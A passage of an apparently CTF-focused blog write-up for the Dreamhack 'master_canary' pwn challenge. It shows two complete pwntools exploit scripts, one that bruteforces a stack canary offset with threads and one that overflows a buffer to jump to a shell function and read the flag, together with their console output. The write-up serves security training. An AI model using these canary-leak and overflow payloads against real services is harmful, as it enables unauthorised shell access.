+<p>Anyways, after you count the bytes up to the canary&rsquo;s null byte and send the payload, you get the leak. And all thread use the same canary, so we can use that anywhere.</p>
+<p>Then, we just need to create the last payload for the buffer overflow in <em>comment</em> and then get the flag.</p>
+<hr>
+<p>Except, remotely, of course the canary is at a different offset. I thought I found it, because it was a random canary-looking value like <code>0x60fd87497505e900</code>, and I just couldn&rsquo;t find what the hell was wrong with my script. And I got too annoyed to keep testing offsets, so I made a bruteforce with threads. And I got back:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>found canary 0x0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to host8.dreamhack.games on port 20197: Done
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to host8.dreamhack.games port <span style="color:#ae81ff">20197</span>
+</span></span><span style="display:flex;"><span>FOUND FLAG AT OFFSET <span style="color:#ae81ff">2281</span>
+</span></span></code></pre></div><p>Here was that script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> concurrent.futures <span style="color:#f92672">import</span> ThreadPoolExecutor
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/home/kali/Downloads/dreamhack/master_canary/master_canary&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>cyberedu <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;host8.dreamhack.games:20197&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip, port <span style="color:#f92672">=</span> cyberedu<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> int(port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#if args.REMOTE:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    p = remote(ip, port)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#else:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    p = elf.process()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_thread</span>(p):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_input</span>(p, size, data):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(size)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(data)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    printed <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1.&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;data printed was </span><span style="color:#e6db74">{</span>printed<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> printed
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exit</span>(p, comment):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(comment)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>getshell <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400a4b</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_canary</span>(j):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> j <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> remote(ip, port)
+</span></span><span style="display:flex;"><span>        create_thread(p)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        canary_leak <span style="color:#f92672">=</span> send_input(p, str(i), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span>)
+</span></span><span style="display:flex;"><span>        garbage, canary_bytes <span style="color:#f92672">=</span> canary_leak<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span>)
+</span></span><span style="display:flex;"><span>        canary_bytes <span style="color:#f92672">=</span> canary_bytes[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">7</span>]
+</span></span><span style="display:flex;"><span>        canary <span style="color:#f92672">=</span> u64(canary_bytes<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;found canary </span><span style="color:#e6db74">{</span>hex(canary)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> canary <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                   p64(canary) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                   <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                   p64(getshell)
+</span></span><span style="display:flex;"><span>                  )
+</span></span><span style="display:flex;"><span>                      
+</span></span><span style="display:flex;"><span>        exit(p, payload)
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ls&#34;</span>)
+</span></span><span style="display:flex;"><span>        sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag&#39;</span> <span style="color:#f92672">in</span> p<span style="color:#f92672">.</span>recvall():
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;FOUND FLAG AT OFFSET </span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cat flag&#34;</span>)
+</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> ThreadPoolExecutor(max_workers<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>) <span style="color:#66d9ef">as</span> executor:
+</span></span><span style="display:flex;"><span>    executor<span style="color:#f92672">.</span>map(find_canary, range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">500</span>))
+</span></span></code></pre></div><p>And here is the script to actually print the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> concurrent.futures <span style="color:#f92672">import</span> ThreadPoolExecutor
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/home/kali/Downloads/dreamhack/master_canary/master_canary&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>cyberedu <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;host8.dreamhack.games:20197&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip, port <span style="color:#f92672">=</span> cyberedu<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> int(port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#if args.REMOTE:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    p = remote(ip, port)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#else:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    p = elf.process()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_thread</span>(p):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_input</span>(p, size, data):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(size)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(data)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    printed <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1.&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;data printed was </span><span style="color:#e6db74">{</span>printed<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> printed
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exit</span>(p, comment):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(comment)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>getshell <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400a4b</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_canary</span>(j):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#i = 8 * j + 1</span>
+</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">=</span> <span style="color:#ae81ff">2281</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> remote(ip, port)
+</span></span><span style="display:flex;"><span>        create_thread(p)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        canary_leak <span style="color:#f92672">=</span> send_input(p, str(i), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span>)
+</span></span><span style="display:flex;"><span>        garbage, canary_bytes <span style="color:#f92672">=</span> canary_leak<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span>)
+</span></span><span style="display:flex;"><span>        canary_bytes <span style="color:#f92672">=</span> canary_bytes[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">7</span>]
+</span></span><span style="display:flex;"><span>        canary <span style="color:#f92672">=</span> u64(canary_bytes<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;found canary </span><span style="color:#e6db74">{</span>hex(canary)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> canary <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                   p64(canary) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                   <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                   p64(getshell)
+</span></span><span style="display:flex;"><span>                  )
+</span></span><span style="display:flex;"><span>                      
+</span></span><span style="display:flex;"><span>        exit(p, payload)
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ls&#34;</span>)
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>                   
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#with ThreadPoolExecutor(max_workers=10) as executor:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    executor.map(find_canary, range(0, 500))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>find_canary(<span style="color:#ae81ff">0</span>)
+</span></span></code></pre></div><p>With the amount of time I tested bad offsets automating it from the start would&rsquo;ve saved me about an hour and a half.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/master_canary-writeup/flag.png#center"></p>
+<hr>
+<p>As always, the full code can be found on my GitHub
+<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/master_canary.py">here</a></strong>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/dreamhack/">Dreamhack</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
